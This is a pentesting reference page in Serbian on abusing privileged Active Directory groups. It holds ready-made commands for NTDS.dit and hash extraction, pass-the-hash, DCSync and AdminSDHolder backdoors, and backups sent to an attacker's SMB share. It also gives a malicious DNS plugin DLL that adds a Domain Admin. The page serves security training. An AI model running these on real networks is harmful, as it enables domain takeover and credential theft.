# Privilegovane grupe

{{#include ../../banners/hacktricks-training.md}}

## Dobro poznate grupe sa administrativnim privilegijama

- **Administrators**
- **Domain Admins**
- **Enterprise Admins**

## Account Operators

Ova grupa ima ovlašćenje da kreira naloge i grupe koje nisu administratorske u domenu. Pored toga, omogućava lokalno prijavljivanje na kontroler domena (DC).

Da biste identifikovali članove ove grupe, izvršava se sledeća naredba:
```bash
Get-NetGroupMember -Identity "Account Operators" -Recurse
```
Dozvoljeno je dodavanje novih korisnika, kao i lokalno prijavljivanje na DC.

## AdminSDHolder grupa

Lista kontrole pristupa (ACL) grupe **AdminSDHolder** je ključna jer postavlja dozvole za sve "protected groups" u Active Directory, uključujući i grupe visokih privilegija. Ovaj mehanizam obezbeđuje bezbednost tih grupa sprečavanjem neautorizovanih izmena.

Napadač bi mogao iskoristiti ovo menjajući ACL grupe **AdminSDHolder**, dodeljujući pune dozvole standardnom korisniku. Time bi taj korisnik praktično dobio potpunu kontrolu nad svim zaštićenim grupama. Ako se dozvole tog korisnika promene ili uklone, one će biti automatski vraćene u roku od jednog sata zbog dizajna sistema.

Najnovija Windows Server dokumentacija i dalje tretira nekoliko ugrađenih operator grupa kao **protected** objekte (`Account Operators`, `Backup Operators`, `Print Operators`, `Server Operators`, `Domain Admins`, `Enterprise Admins`, `Key Admins`, `Enterprise Key Admins`, itd.). Proces **SDProp** se izvršava na **PDC Emulator**-u svakih 60 minuta podrazumevano, postavlja `adminCount=1` i onemogućava nasleđivanje na zaštićenim objektima. Ovo je korisno i za persistence i za otkrivanje zastarelih privilegovanih korisnika koji su uklonjeni iz zaštićene grupe, ali i dalje zadržavaju ACL bez nasleđivanja.

Komande za pregled članova i izmenu dozvola uključuju:
```bash
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```

```powershell
# Hunt users/groups that still have adminCount=1
Get-ADObject -LDAPFilter '(adminCount=1)' -Properties adminCount,distinguishedName |
Select-Object distinguishedName
```
Dostupan je skript za ubrzanje procesa vraćanja: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).

Za više detalja, posetite [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence).

## AD Recycle Bin

Članstvo u ovoj grupi omogućava čitanje obrisanih Active Directory objekata, što može otkriti osetljive informacije:
```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
Ovo je korisno za **oporavak prethodnih puteva privilegija**. Obrisani objekti i dalje mogu otkriti `lastKnownParent`, `memberOf`, `sIDHistory`, `adminCount`, old SPNs, ili DN obrisane privilegovane grupe, koja kasnije može biti vraćena od strane drugog operatera.
```powershell
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects `
-Properties samAccountName,lastKnownParent,memberOf,sIDHistory,adminCount,servicePrincipalName |
Select-Object samAccountName,lastKnownParent,adminCount,sIDHistory,servicePrincipalName
```
### Pristup kontroleru domena

Pristup fajlovima na DC je ograničen osim ako korisnik nije član grupe `Server Operators`, koja menja nivo pristupa.

### Eskalacija privilegija

Korišćenjem `PsService` ili `sc` iz Sysinternals, moguće je pregledati i izmeniti dozvole servisa. Grupa `Server Operators`, na primer, ima potpuni kontrolu nad određenim servisima, što omogućava izvršavanje proizvoljnih komandi i eskalaciju privilegija:
```cmd
C:\> .\PsService.exe security AppReadiness
```
Ova komanda otkriva da `Server Operators` imaju pun pristup, što omogućava manipulaciju servisima radi dobijanja povišenih privilegija.

## Backup Operators

Članstvo u grupi `Backup Operators` daje pristup fajl-sistemu `DC01` zbog privilegija `SeBackup` i `SeRestore`. Ove privilegije omogućavaju pregledavanje direktorijuma, listanje i kopiranje fajlova, čak i bez eksplicitnih dozvola, koristeći zastavicu `FILE_FLAG_BACKUP_SEMANTICS`. Potrebno je koristiti odgovarajuće skripte za ovaj proces.

Da biste izlistali članove grupe, izvršite:
```bash
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```
### Lokalni napad

Da bi se ove privilegije iskoristile lokalno, primenjuju se sledeći koraci:

1. Uvezi neophodne biblioteke:
```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```
2. Omogućite i proverite `SeBackupPrivilege`:
```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```
3. Pristupite i kopirajte fajlove iz ograničenih direktorijuma, na primer:
```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```
### AD Attack

Direktan pristup sistemu datoteka Domain Controller-a omogućava krađu baze podataka `NTDS.dit`, koja sadrži sve NTLM hashes za korisnike i računare domena.

#### Korišćenje diskshadow.exe

1. Napravite shadow copy diska `C`:
```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```
2. Kopirajte `NTDS.dit` iz shadow kopije:
```cmd
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
Alternativno, koristite `robocopy` za kopiranje datoteka:
```cmd
robocopy /B F:\Windows\NTDS .\ntds ntds.dit
```
3. Izvucite `SYSTEM` i `SAM` za pribavljanje hash-a:
```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
4. Preuzmi sve hashes iz `NTDS.dit`:
```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
5. Nakon ekstrakcije: Pass-the-Hash na DA
```bash
# Use the recovered Administrator NT hash to authenticate without the cleartext password
netexec winrm <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> -x "whoami"

# Or execute via SMB using an exec method
netexec smb <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> --exec-method smbexec -x cmd
```
#### Korišćenje wbadmin.exe

1. Podesite NTFS fajl-sistem za SMB server na mašini napadača i keširajte SMB kredencijale na ciljnoj mašini.
2. Koristite `wbadmin.exe` za backup sistema i ekstrakciju `NTDS.dit`:
```cmd
net use X: \\<AttackIP>\sharename /user:smbuser password
echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
wbadmin get versions
echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```

Za praktičnu demonstraciju, pogledajte [DEMO VIDEO WITH IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).

## DnsAdmins

Članovi grupe **DnsAdmins** mogu iskoristiti svoje privilegije da učitaju proizvoljan DLL sa SYSTEM privilegijama na DNS serveru, koji se često nalazi na kontrolerima domena. Ova mogućnost pruža značajan potencijal za eksploataciju.

Da biste prikazali članove grupe DnsAdmins, koristite:
```bash
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```
### Execute arbitrary DLL (CVE‑2021‑40469)

> [!NOTE]
> Ova ranjivost omogućava izvršavanje proizvoljnog koda sa SYSTEM privilegijama u DNS servisu (obično unutar DC-ova). Ovaj problem je ispravljen 2021. godine.

Članovi mogu naterati DNS server da učita proizvoljan DLL (bilo lokalno ili sa udaljenog deljenog resursa) koristeći komande kao što su:
```bash
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:

# If dnscmd is not installed run from aprivileged PowerShell session:
Install-WindowsFeature -Name RSAT-DNS-Server -IncludeManagementTools
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```
Ponovno pokretanje DNS servisa (što može zahtevati dodatna ovlašćenja) neophodno je da bi se DLL učitao:
```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```
Za više detalja o ovom vektoru napada, pogledajte ired.team.

#### Mimilib.dll

Takođe je izvodljivo koristiti mimilib.dll za izvršavanje komandi, modifikujući ga da izvrši specifične komande ili reverse shells. [Check this post](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) za više informacija.

### WPAD zapis za MitM

DnsAdmins mogu manipulisati DNS zapisima da izvedu Man-in-the-Middle (MitM) napade stvaranjem WPAD zapisa nakon onemogućavanja globalnog query block lista. Alati poput Responder ili Inveigh mogu se koristiti za spoofing i presretanje mrežnog saobraćaja.

### Čitači dnevnika događaja
Članovi mogu pristupiti dnevnicima događaja, potencijalno pronalazeći osetljive informacije kao što su plaintext passwords ili detalji izvršavanja komandi:
```bash
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```
## Exchange Windows dozvole

Ova grupa može menjati DACLs na domain objektu, potencijalno dodeljujući DCSync privilegije. Tehnike za privilege escalation koje zloupotrebljavaju ovu grupu detaljno su opisane u Exchange-AD-Privesc GitHub repo.
```bash
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```
Ako možete da delujete kao član ove grupe, klasična zloupotreba je dodeljivanje principalu kojim upravlja napadač prava replikacije potrebnih za [DCSync](dcsync.md):
```bash
Add-DomainObjectAcl -TargetIdentity "DC=testlab,DC=local" -PrincipalIdentity attacker -Rights DCSync
Get-ObjectAcl -DistinguishedName "DC=testlab,DC=local" -ResolveGUIDs | ?{$_.IdentityReference -match 'attacker'}
```
Istorijski, **PrivExchange** je lančao pristup mailbox-ovima, prisilnu Exchange autentifikaciju i LDAP relay da bi stigao do ove iste primitive. Čak i gde je taj relay put ublažen, direktno članstvo u `Exchange Windows Permissions` ili kontrola Exchange servera ostaje visokovredan put do prava replikacije domena.

## Hyper-V Administrators

Hyper-V Administrators imaju potpuni pristup Hyper-V, što se može iskoristiti za preuzimanje kontrole nad virtualizovanim Domain Controllers. Ovo uključuje kloniranje aktivnih DC-ova i izvlačenje NTLM heševa iz fajla `NTDS.dit`.

### Primer eksploatacije

Praktična zloupotreba obično je **offline pristup diskovima/checkpoint-ovima DC-a** umesto starih host-level LPE trikova. Sa pristupom Hyper-V hostu, operator može napraviti checkpoint ili izvesti virtualizovani Domain Controller, mount-ovati VHDX i izvući `NTDS.dit`, `SYSTEM`, i druge tajne bez diranja LSASS unutar gosta:
```bash
# Host-side enumeration
Get-VM
Get-VHD -VMId <vm-guid>

# After exporting or checkpointing the DC, mount the disk read-only
Mount-VHD -Path 'C:\HyperV\Virtual Hard Disks\DC01.vhdx' -ReadOnly
```
Odatle ponovo iskoristite `Backup Operators` workflow da kopirate `Windows\NTDS\ntds.dit` i registry hives offline.

## Group Policy Creators Owners

Ova grupa omogućava članovima da kreiraju Group Policies u domenu. Međutim, njeni članovi ne mogu da primenjuju Group Policies na korisnike ili grupe niti da uređuju postojeće GPOs.

Važna nijansa je da **kreator postaje vlasnik novog GPO-a** i obično dobija dovoljno prava da ga kasnije uređuje. To znači da je ova grupa interesantna kada možete ili:

- napraviti maliciozni GPO i ubediti admina da ga poveže sa ciljanom OU/domain
- urediti GPO koji ste kreirali, a koji je već povezan negde korisno
- iskoristiti neko drugo delegirano pravo koje vam omogućava da povežete GPOs, dok vam ova grupa daje mogućnost uređivanja

Praktična zloupotreba obično znači dodavanje **Immediate Task**, **startup script**, **local admin membership**, ili promene **user rights assignment** kroz SYSVOL-backed policy fajlove.
```bash
# Example with SharpGPOAbuse: add an immediate task that executes as SYSTEM
SharpGPOAbuse.exe --AddImmediateTask --TaskName "HT-Task" --Author TESTLAB\\Administrator --Command "cmd.exe" --Arguments "/c whoami > C:\\Windows\\Temp\\gpo.txt" --GPOName "Security Update"
```
Ako uređujete GPO ručno putem `SYSVOL`, zapamtite da sama promena nije dovoljna: `versionNumber`, `GPT.ini`, i ponekad `gPCMachineExtensionNames` takođe moraju biti ažurirani ili će klijenti ignorisati osvežavanje politike.

## Upravljanje organizacijom

U okruženjima gde je deployed **Microsoft Exchange**, posebna grupa poznata kao **Organization Management** ima značajne mogućnosti. Ova grupa ima privilegiju da **pristupi poštanskim sandučićima svih korisnika domena** i ima potpunu kontrolu nad organizacionom jedinicom (OU) 'Microsoft Exchange Security Groups'. Ta kontrola uključuje grupu **`Exchange Windows Permissions`**, koju je moguće iskoristiti za eskalaciju privilegija.

### Eksploatacija privilegija i komande

#### Print Operators

Članovi grupe **Print Operators** poseduju nekoliko privilegija, uključujući **`SeLoadDriverPrivilege`**, koja im omogućava da se **lokalno prijave na Domain Controller**, isključe ga i upravljaju štampačima. Da biste iskoristili ove privilegije, posebno ako **`SeLoadDriverPrivilege`** nije vidljiv u ne-povišenom kontekstu, neophodno je zaobići User Account Control (UAC).

Za listanje članova ove grupe koristi se sledeća PowerShell komanda:
```bash
Get-NetGroupMember -Identity "Print Operators" -Recurse
```
Na Domain Controller-ima ova grupa je opasna zato što podrazumevana Domain Controller Policy dodeljuje **`SeLoadDriverPrivilege`** grupi `Print Operators`. Ako dobijete elevated token za člana ove grupe, možete omogućiti tu privilegiju i učitati potpisani, ali ranjivi driver kako biste prešli u kernel/SYSTEM. Za detalje o rukovanju tokenima, pogledajte [Access Tokens](../windows-local-privilege-escalation/access-tokens.md).

#### Remote Desktop Users

Članovima ove grupe je omogućen pristup računarima preko Remote Desktop Protocol (RDP). Za izlistavanje članova dostupne su PowerShell komande:
```bash
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```
Dalji uvidi u iskorištavanje RDP-a mogu se naći u posvećenim pentesting resursima.

#### Korisnici daljinskog upravljanja

Članovi mogu pristupiti računarima preko **Windows Remote Management (WinRM)**. Enumeracija ovih članova postiže se putem:
```bash
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```
For exploitation techniques related to **WinRM**, specific documentation should be consulted.

#### Server Operators

Ova grupa ima dozvole za izvođenje različitih konfiguracija na Domain Controllers, uključujući privilegije za pravljenje rezervnih kopija i vraćanje, promenu sistemskog vremena i gašenje sistema. Za nabrajanje članova koristi se sledeća komanda:
```bash
Get-NetGroupMember -Identity "Server Operators" -Recurse
```
Na kontrolerima domena, `Server Operators` obično nasleđuju dovoljno prava da **rekonfigurišu ili pokreću/zaustavljaju servise** i takođe dobijaju `SeBackupPrivilege`/`SeRestorePrivilege` kroz podrazumevanu DC politiku. U praksi ih to čini mostom između **service-control abuse** i **NTDS extraction**:
```cmd
sc.exe \\dc01 query
sc.exe \\dc01 qc <service>
.\PsService.exe security <service>
```
Ako ACL servisa dodeli ovoj grupi pravo promene/pokretanja, usmeri servis na proizvoljnu komandu, pokreni ga kao `LocalSystem`, a zatim vrati originalni `binPath`. Ako je kontrola servisa zaključana, pribegni tehnikama `Backup Operators` navedenim iznad da kopiraš `NTDS.dit`.

## References <a href="#references" id="references"></a>

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory)
- [https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--](https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/](http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)
- [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [https://rastamouse.me/2019/01/gpo-abuse-part-1/](https://rastamouse.me/2019/01/gpo-abuse-part-1/)
- [https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
- [https://github.com/tandasat/ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
- [https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
- [https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
- [https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
- [https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html](https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)
- [HTB: Baby — Anonymous LDAP → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)
- [https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory)
- [https://labs.withsecure.com/tools/sharpgpoabuse](https://labs.withsecure.com/tools/sharpgpoabuse)


{{#include ../../banners/hacktricks-training.md}}
